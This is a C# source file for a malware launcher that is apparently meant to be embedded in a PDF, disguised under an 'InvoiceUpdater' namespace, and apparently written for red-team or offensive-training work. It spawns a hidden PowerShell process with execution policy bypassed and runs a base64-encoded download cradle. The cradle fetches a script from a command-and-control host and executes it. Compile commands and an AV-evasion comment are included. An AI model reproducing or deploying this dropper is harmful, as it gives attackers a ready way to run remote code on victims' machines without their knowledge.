// payload.cs — the launcher embedded in the PDF.
// Compile with:
//   Windows:  csc /target:exe /platform:x64 /out:payload.exe payload.cs
//   Linux:    mcs -platform:x64 -out:payload.exe payload.cs
//
// Downloads run.txt from the C2 and IEX's it, same cradle as the DOC vector.

using System;
using System.Diagnostics;

namespace InvoiceUpdater
{
    class Program
    {
        static void Main()
        {
            // Base64-encoded PowerShell cradle. Regenerate with:
            //   [Convert]::ToBase64String(
            //       [Text.Encoding]::Unicode.GetBytes($cmd))
            // where $cmd is:
            //   iex((new-object system.net.webclient)
            //       .downloadstring('http://192.168.119.120/run.txt'))
            string encoded =
                "KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBi" +
                "AEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgA" +
                "dAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQAuADEAMgAwAC8AcgB1AG4ALgB0" +
                "AHgAdAAnACkAIAB8ACAASQBFAFgA";

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName        = "powershell.exe",
                Arguments       = "-exec bypass -nop -w hidden -enc " + encoded,
                UseShellExecute = false,
                CreateNoWindow  = true,
                WindowStyle     = ProcessWindowStyle.Hidden
            };

            try
            {
                Process.Start(psi);
            }
            catch
            {
                // Swallow — the process may be blocked by AppLocker or AV.
                // In a real engagement you would log and pivot to a fallback.
            }
        }
    }
}
